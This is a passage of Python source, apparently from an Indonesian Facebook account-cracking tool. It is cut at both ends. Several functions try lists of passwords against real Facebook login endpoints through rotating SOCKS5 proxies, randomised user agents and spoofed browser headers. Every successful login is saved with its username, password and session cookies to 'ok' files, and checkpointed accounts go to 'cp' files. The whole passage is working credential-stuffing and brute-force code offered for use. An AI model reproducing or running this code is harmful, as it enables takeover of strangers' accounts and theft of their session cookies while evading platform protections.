                 "bi_wvdp":'{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
                 "encpass":f"#PWD_BROWSER:0:{str(mark()).split('.')[0]}:{pw}",
                 "jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
                 "lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1)
               }
               headers = {
                  "Host": "m.facebook.com",
                  "content-length": "2168",
                  "sec-ch-ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
                  "sec-ch-ua-mobile": "?1",
                  "user-agent": ua,
                  "viewport-width": "501",
                  "content-type": "application/x-www-form-urlencoded",
                  "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
                  "sec-ch-ua-platform-version": '"12.0.0"',
                  "x-asbd-id": "129477",
                  "dpr": "1.4375",
                  "sec-ch-ua-full-version-list": '"Google Chrome";v="117.0.5938.61", "Not;A=Brand";v="8.0.0.0", "Chromium";v="117.0.5938.61"',
                  "sec-ch-ua-model": '"CPH2127"',
                  "sec-ch-prefers-color-scheme": "light",
                  "sec-ch-ua-platform": '"Android"',
                  "accept": "*/*",
                  "origin": "https://m.facebook.com",
                  "sec-fetch-site": "same-origin",
                  "sec-fetch-mode": "cors",
                  "sec-fetch-dest": "empty",
                  "referer": "https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
                  "accept-encoding": "gzip, deflate, br",
                  "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,vi;q=0.6,ms;q=0.5"
               }
               cokii = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
               response = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100', cookies = {'cookie':cokii}, data = data, headers = headers, proxies = proxis, allow_redirects=False)
               if "c_user" in ses.cookies.get_dict():
                  kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                  tree = Tree(f"\r",guide_style="bold grey100")
                  tree.add(f"{H2}{user} | {pw}").add(f'{H2}{kuki} {ua}')
                  prints(tree)
                  kntl = (f"{user}|{pw}|{kuki}")
                  self.live.append(kntl)
                  with open("Results/ok.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                  break
               elif "checkpoint" in ses.cookies.get_dict():
                    tree.add(f"{K2}{user} | {pw}").add(f'{K2}{ua}')
                    kntl = (f"{user}|{pw}")
                    self.check.append(kntl)
                    with open("Results/cp.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
               else:
                    continue
           except requests.exceptions.ConnectionError as e:
               prog.update(des,description=f">RR07X | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
               prog.advance(des)
               sleep(15)
       self.loop+=1
   
   def validateAPI(self, user, password):
       prog.update(des,description=f">RR07X | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
       prog.advance(des) 
       ses = requests.Session()
       proxx = REQ().get_Proxy()
       ua = uaku2()
       for pw in password:
           try:
               proxis = {'http': 'socks5://' + random.choice(proxx)}
               link = ses.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&wtsid=rdr_03thTOvDjPwW2IySg&refsrc=deprecated&_rdr')
               data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
                 "jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
                 "uid":user,
                 "next":"https://mbasic.facebook.com/login/save-device/",
                 "flow":"login_no_pin",
                 "pass":pw
               }
               headers = {
                  "Host": "mbasic.facebook.com",
                  "content-length": "144",
                  "cache-control": "max-age=0",
                  "dpr": "1.4375",
                  "viewport-width": "980",
                  "sec-ch-ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
                  "sec-ch-ua-mobile": "?1",
                  "sec-ch-ua-platform": '"Android"',
                  "sec-ch-ua-platform-version": '"12.0.0"',
                  "sec-ch-ua-model": '"CPH2127"',
                  "sec-ch-ua-full-version-list": '"Google Chrome";v="117.0.5938.61", "Not;A=Brand";v="8.0.0.0", "Chromium";v="117.0.5938.61"',
                  "sec-ch-prefers-color-scheme": "light",
                  "upgrade-insecure-requests": "1",
                  "origin": "https://mbasic.facebook.com",
                  "content-type": "application/x-www-form-urlencoded",
                  "user-agent": ua,
                  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                  "sec-fetch-site": "same-origin",
                  "sec-fetch-mode": "navigate",
                  "sec-fetch-user": "?1",
                  "sec-fetch-dest": "document",
                  "referer": f"https://mbasic.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&wtsid=rdr_03thTOvDjPwW2IySg&refsrc=deprecated&_rdr",
                  "accept-encoding": "gzip, deflate, br",
                  "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,vi;q=0.6,ms;q=0.5"
               }
               cokii = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
               response = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data = data, headers = headers, proxies = proxis, allow_redirects=True)
               if "c_user" in ses.cookies.get_dict():
                  kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                  tree = Tree(f"\r",guide_style="bold grey100")
                  tree.add(f"{H2}{user} | {pw}").add(f'{H2}{kuki} {ua}')
                  prints(tree)
                  kntl = (f"{user}|{pw}|{kuki}")
                  self.live.append(kntl)
                  with open("Results/ok.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                  break
               elif "checkpoint" in ses.cookies.get_dict():
                    tree.add(f"{K2}{user} | {pw}").add(f'{K2}{ua}')
                    kntl = (f"{user}|{pw}")
                    self.check.append(kntl)
                    with open("Results/cp.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
               else:
                    continue
           except requests.exceptions.ConnectionError as e:
               prog.update(des,description=f">RR07X | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
               prog.advance(des)
               sleep(15)
       self.loop+=1
   
   def regularAPI(self, user, password):
       prog.update(des,description=f">RR07X | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
       prog.advance(des) 
       ses = requests.Session()
       proxx = REQ().get_Proxy()
       ua = uaku2()
       for pw in password:
           try:
               proxis = {'http': 'socks5://' + random.choice(proxx)}
               link = ses.get('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8')
               data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
                 "jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
                 "m_ts":re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
                 "li":re.search('name="li" value="(.*?)"', str(link.text)).group(1),
                 "try_number":0,
                 "unrecognized_tries":0,
                 "email":user,
                 "pass":pw,
                 "login":"Masuk",
                 "bi_xrwh":re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1)
               }
               headers = {
                  "Host": "free.facebook.com",
                  "content-length": "177",
                  "cache-control": "max-age=0",
                  "upgrade-insecure-requests": "1",
                  "origin": "https://free.facebook.com",
                  "content-type": "application/x-www-form-urlencoded",
                  "user-agent": ua,
                  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                  "x-requested-with": "mark.via.gp",
                  "sec-fetch-site": "same-origin",
                  "sec-fetch-mode": "navigate",
                  "sec-fetch-user": "?1",
                  "sec-fetch-dest": "document",
                  "referer": "https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
                  "accept-encoding": "gzip, deflate",
                  "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
               }
               cokii = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
               response = ses.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl',data = data, headers = headers, proxies = proxis, allow_redirects=False)
               if "c_user" in ses.cookies.get_dict():
                  kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                  tree = Tree(f"\r",guide_style="bold grey100")
                  tree.add(f"{H2}{user} | {pw}").add(f'{H2}{kuki} {ua}')
                  prints(tree)
                  kntl = (f"{user}|{pw}|{kuki}")
                  self.live.append(kntl)
                  with open("Results/ok.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                  break
               elif "checkpoint" in ses.cookies.get_dict():
                    tree.add(f"{K2}{user} | {pw}").add(f'{K2}{ua}')
                    kntl = (f"{user}|{pw}")
                    self.check.append(kntl)
                    with open("Results/cp.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
               else:
                    continue
           except requests.exceptions.ConnectionError as e:
               prog.update(des,description=f">RR07X | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
               prog.advance(des)
               sleep(15)
       self.loop+=1
   
   def asyncAPP(self, user, password):
       prog.update(des,description=f">RR07X | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
       prog.advance(des) 
       ses = requests.Session()
       proxx = REQ().get_Proxy()
       ua = uaku2()
       for pw in password:
           try:
               proxis = {'http': 'socks5://' + random.choice(proxx)}
               link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv18.0%2Fdialog%2Foauth%3Fapp_id%3D1862952583919182%26cbt%3D1703222256708%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df20b65da6024398%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Ff1b243c652f4f2%2526relation%253Dopener%26client_id%3D1862952583919182%26display%3Dtouch%26domain%3Dwww.tiktok.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Fsignup%252F%253Fenter_method%253Denter_personal_homepage%2526enter_from%253Dpersonal_homepage%2526launch_type%253D0%2526lang%253Did-ID%2526redirect_url%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Fprofile%26locale%3Den_US%26logger_id%3Df217822085af3d%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1629871d73961%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Ff1b243c652f4f2%2526relation%253Dopener%2526frame%253Df1cbd2b1886fc3c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv18.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1629871d73961%26domain%3Dwww.tiktok.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.tiktok.com%252Ff1b243c652f4f2%26relation%3Dopener%26frame%3Df1cbd2b1886fc3c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',headers = {'User-Agent':ua})
               data = {
                 "m_ts":re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
                 "li":re.search('name="li" value="(.*?)"', str(link.text)).group(1),
                 "try_number":0,
                 "unrecognized_tries":0,
                 "email":user,
                 "prefill_contact_point":f"{user} {pw}",
                 "prefill_source":"browser_dropdown",
                 "prefill_type":"password",
                 "first_prefill_source":"browser_dropdown",
                 "first_prefill_type":"contact_point",
                 "had_cp_prefilled":True,
                 "had_password_prefilled":True,
                 "is_smart_lock":False,
                 "bi_xrwh":0,
                 "bi_wvdp":'{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
                 "encpass":f"#PWD_BROWSER:0:{str(mark()).split('.')[0]}:{pw}",
                 "jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
                 "lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1)
               }
               headers = {
                  "Host": "m.facebook.com",
                  "content-length": "2167",
                  "sec-ch-ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
                  "sec-ch-ua-mobile": "?1",
                  "user-agent": ua,
                  "viewport-width": "501",
                  "content-type": "application/x-www-form-urlencoded",
                  "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
                  "sec-ch-ua-platform-version": '"12.0.0"',
                  "x-asbd-id": "129477",
                  "dpr": "1.4375",
                  "sec-ch-ua-full-version-list": '"Google Chrome";v="117.0.5938.61", "Not;A=Brand";v="8.0.0.0", "Chromium";v="117.0.5938.61"',
                  "sec-ch-ua-model": '"CPH2127"',
                  "sec-ch-prefers-color-scheme": "light",
                  "sec-ch-ua-platform": '"Android"',
                  "accept": "*/*",
                  "origin": "https://m.facebook.com",
                  "sec-fetch-site": "same-origin",
                  "sec-fetch-mode": "cors",
                  "sec-fetch-dest": "empty",
                  "referer": "https://m.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv18.0%2Fdialog%2Foauth%3Fapp_id%3D1862952583919182%26cbt%3D1703222256708%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df20b65da6024398%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Ff1b243c652f4f2%2526relation%253Dopener%26client_id%3D1862952583919182%26display%3Dtouch%26domain%3Dwww.tiktok.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Fsignup%252F%253Fenter_method%253Denter_personal_homepage%2526enter_from%253Dpersonal_homepage%2526launch_type%253D0%2526lang%253Did-ID%2526redirect_url%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Fprofile%26locale%3Den_US%26logger_id%3Df217822085af3d%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1629871d73961%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Ff1b243c652f4f2%2526relation%253Dopener%2526frame%253Df1cbd2b1886fc3c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv18.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1629871d73961%26domain%3Dwww.tiktok.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.tiktok.com%252Ff1b243c652f4f2%26relation%3Dopener%26frame%3Df1cbd2b1886fc3c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
                  "accept-encoding": "gzip, deflate, br",
                  "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,vi;q=0.6,ms;q=0.5"
               }
               cokii = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
               response = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=1862952583919182&auth_token=93f0b61b177d4c14afdb43cbde26a2e2&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv18.0%2Fdialog%2Foauth%3Fapp_id%3D1862952583919182%26cbt%3D1703222256708%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df20b65da6024398%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Ff1b243c652f4f2%2526relation%253Dopener%26client_id%3D1862952583919182%26display%3Dtouch%26domain%3Dwww.tiktok.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Fsignup%252F%253Fenter_method%253Denter_personal_homepage%2526enter_from%253Dpersonal_homepage%2526launch_type%253D0%2526lang%253Did-ID%2526redirect_url%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Fprofile%26locale%3Den_US%26logger_id%3Df217822085af3d%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1629871d73961%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Ff1b243c652f4f2%2526relation%253Dopener%2526frame%253Df1cbd2b1886fc3c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv18.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=1862952583919182&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1629871d73961%26domain%3Dwww.tiktok.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.tiktok.com%252Ff1b243c652f4f2%26relation%3Dopener%26frame%3Df1cbd2b1886fc3c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100',cookies = {'cookie':cokii}, data = data, headers = headers, proxies = proxis, allow_redirects=False)
               if "c_user" in ses.cookies.get_dict():
                  kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                  tree = Tree(f"\r",guide_style="bold grey100")
                  tree.add(f"{H2}{user} | {pw}").add(f'{H2}{kuki} {ua}')
                  prints(tree)
                  kntl = (f"{user}|{pw}|{kuki}")
                  self.live.append(kntl)
                  with open("Results/ok.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                  break
               elif "checkpoint" in ses.cookies.get_dict():
                    tree.add(f"{K2}{user} | {pw}").add(f'{K2}{ua}')
                    kntl = (f"{user}|{pw}")
                    self.check.append(kntl)
                    with open("Results/cp.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
               else:
                    continue
           except requests.exceptions.ConnectionError as e:
               prog.update(des,description=f">RR07X | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
               prog.advance(des)
               sleep(15)
       self.loop+=1
#--------------------[ METODE-MOBILE ]-----------------#
def rr078(user, password):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	sys.stdout.write(f"\r[{bo}RR07 v8{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] [{U}OK-{x}:{H}{ok}] [{U}CP-{x}:{K}{cp}{x}] [{U}Crack-:{bo}{idf}{x}]"),
	sys.stdout.flush()
	bro = random.choice(["com.google.android.captiveportallogin","com.chrome.beta","com.kiwibrowser.browser","org.gnu.icecat","com.cookiegames.smartcookie","com.facebook.lite","com.instagram.barcelona","com.instagram.boomerang","com.mx.browser","com.opera.browser"])
	ua = uaku2()
	get = geturlm()
	url = random.choice(["mobile.facebook.com","m.facebook.com","m.prod.facebook.com","d.facebook.com","mbasic.prod.facebook.com","mbasic.facebook.com","x.facebook.com"])
	post = posturlm()
	ua = uaku2()
	ses = requests.Session()
	for pw in password:
		try:
			link = ses.get(get)
			data = {
    "m_ts": re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
    "li": re.search('name="li" value="(.*?)"', str(link.text)).group(1),
    "try_number": re.search('name="try_number" value="(.*?)"', str(link.text)).group(1),
    "unrecognized_tries": re.search(
        'name="unrecognized_tries" value="(.*?)"', str(link.text)
    ).group(1),
    "email": user,
    "prefill_contact_point": "",
    "prefill_source": "",
    "prefill_type": "",
    "first_prefill_source": "",
    "first_prefill_type": "",
    "had_cp_prefilled": "true",
    "had_password_prefilled": "false",
    "is_smart_lock": "false",
    "bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1),
    "encpass": "#PWD_BROWSER:0:{}:{}".format(
        re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1), pw
    ),
    "fb_dtsg": "",
    "jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
    "lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
    "__dyn": "",
    "__csr": "",
    "__req": random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),
    "__a": "",
    "__user": 0,
}

			yusup = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
			head = {
    "Host": url,
    "accept": "*/*",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    "content-type": "application/x-www-form-urlencoded",
    # 'cookie': 'datr=5xlCZcUZoC20eHcjP1RKaq9x; sb=5xlCZQeARAewyul8AgVXu5tI; m_pixel_ratio=1; wd=1348x945; fr=021vFCCZWdLSjl1ME..BlQhnn.ND.AAA.0.0.BlSsdE.AWUz3aQNXS4',
    "dpr": f"{str(rr(1,5))}",
    "origin": f"https://"+url,
    "referer": get,
    "sec-ch-prefers-color-scheme": "light",
    "sec-ch-ua": f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(40,114))}", "Google Chrome";v="{str(rr(40,114))}"',
    "sec-ch-ua-full-version-list": f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-model": '""',
    "sec-ch-ua-platform": '"Windows"',
    "sec-ch-ua-platform-version": f'"{str(rr(5,12))}.0.0"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "user-agent": ua,
    "viewport-width": f"{str(rr(300,999))}",
    "x-asbd-id": "129477",
    "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
    "x-requested-with": bro,
    "x-response-format": "JSONStream",
}
			ses.post(post,headers=head,data=data,cookies={'cookie': yusup},allow_redirects=False)
			if "checkpoint" in ses.cookies.get_dict().keys():
				print(f"\r{H2}  ⫸{P2} User Id : {B2}{uid}")
				print(f"\r{H2}  ⫸{P2} Password : {B2}{pw}")
				print(f"\r{H2} ╰─▶ [bold purple]{ua}")
				open('CP/'+cpc,'a').write(uid+'|'+pw+'\n')
				akun.append(username+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki = ses.cookies.get_dict()
				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
				print(f"\r{H2}  ⫸{P2} User Id : {B2}{uid}")
				print(f"\r{H2}  ⫸{P2} Password : {B2}{pw}")
				print(f"\r{H2} ╰─▶ [bold green]{kuki}")
				print(f"\r{H2} ╰─▶ [bold purple]{ua}")
				open('OK/'+okc,'a').write(uid+'|'+pw+'|'+kuki+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
def geturlm():
    url = random.choice(["mobile.facebook.com","m.facebook.com","m.prod.facebook.com","d.facebook.com","mbasic.prod.facebook.com","mbasic.facebook.com","x.facebook.com"])
    gok = f"https://{url}/login.php?skip_api_login=1&api_key=322935469656730&kid_directed_site=0&app_id=322935469656730&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D322935469656730%26redirect_uri%3Dhttps%253A%252F%252Fauth.meta.com%252Flogin%252Ffacebook%252Fresponse%252F%253Fstate%253DATBTc4ms138Pp2xHXzkNcmeI7vVr8qwBB7D167Pj-QHBlG0ALPaXnyL7oCjALVAKs8XCzqUYyWx5jl8KkUp3JjzyOrGFRjiLzyfbASYI63BJpeo862ReIhjwh1duoac8YTuwiA7aY0qiS-0kEeJZgVgPetltMzzH0ULSbmCp2NYo1MttqFsLIViT7tU0zIANaRUEpBOaCF6bz3YxQ69QnFCHzJ8gQWGv3Za1pyzkuGn0XtiuIQI3writ8nZJq657qRiIEWS4WiILWe43JoHqRX-EdNPtHUol9yfrtqAG8OjC-wgWTH6_XXkUpVVtWWBbYFEV5epIF54ZYLlS1KPcd7AmQ0EPZYZgiar1gDylNBqPdtsOSvE9ZN2jcx6jPfxpwEeQ92umRlD4LPw58xKSON672YfR2NEmBB4W-vkSv8WKb8O6QJ4EK4qUanKoYnBp62JHqSPj0xFwl-6xJcanndB3yNMxugsOz6uTaCORDSgSoTJZnLNrz12qG-jex-XAEmaF4GcrNXibeBzzZJhcmCcDdK9tQSids_JHHLX-SLLI6y9FYBlCV9LHHaATAAOlM_7lu-eGSoxjdEqTf64eftnTXq-JEyq-9MKtEOQXgLMyY-2-cxU82O0koiBgjNgZtoq0CPyHz2mCenqvUo2n-FLL4KV2K2MCk5-QtmlyzgZELyF24rHhYH45GfTcxPij6GtqegaqYSwJ-wfCJ1IBGla5YYnxc6S4lsCfx8IfDoVekN9-sIbo5G-btoB4UFrd5OEQMlvA73lIA6aTkWBLvc_4WpwZCD3PDWMqWUBlFE5dJLMGj3IVPrUDU92YlOp4jx-xT4V-5lyfP02RMFEZ83LLm2p6eqoY6qUgNWri02dWdIv0DwWRMwpj5H2qq8vIltPROdjusaqNNvmR9L9hZQ%26response_type%3Dcode%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D63470cb6-d195-4c66-bef3-bbb265d4fa7b%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.meta.com%2Flogin%2Ffacebook%2Fresponse%2F%3Fstate%3DATBTc4ms138Pp2xHXzkNcmeI7vVr8qwBB7D167Pj-QHBlG0ALPaXnyL7oCjALVAKs8XCzqUYyWx5jl8KkUp3JjzyOrGFRjiLzyfbASYI63BJpeo862ReIhjwh1duoac8YTuwiA7aY0qiS-0kEeJZgVgPetltMzzH0ULSbmCp2NYo1MttqFsLIViT7tU0zIANaRUEpBOaCF6bz3YxQ69QnFCHzJ8gQWGv3Za1pyzkuGn0XtiuIQI3writ8nZJq657qRiIEWS4WiILWe43JoHqRX-EdNPtHUol9yfrtqAG8OjC-wgWTH6_XXkUpVVtWWBbYFEV5epIF54ZYLlS1KPcd7AmQ0EPZYZgiar1gDylNBqPdtsOSvE9ZN2jcx6jPfxpwEeQ92umRlD4LPw58xKSON672YfR2NEmBB4W-vkSv8WKb8O6QJ4EK4qUanKoYnBp62JHqSPj0xFwl-6xJcanndB3yNMxugsOz6uTaCORDSgSoTJZnLNrz12qG-jex-XAEmaF4GcrNXibeBzzZJhcmCcDdK9tQSids_JHHLX-SLLI6y9FYBlCV9LHHaATAAOlM_7lu-eGSoxjdEqTf64eftnTXq-JEyq-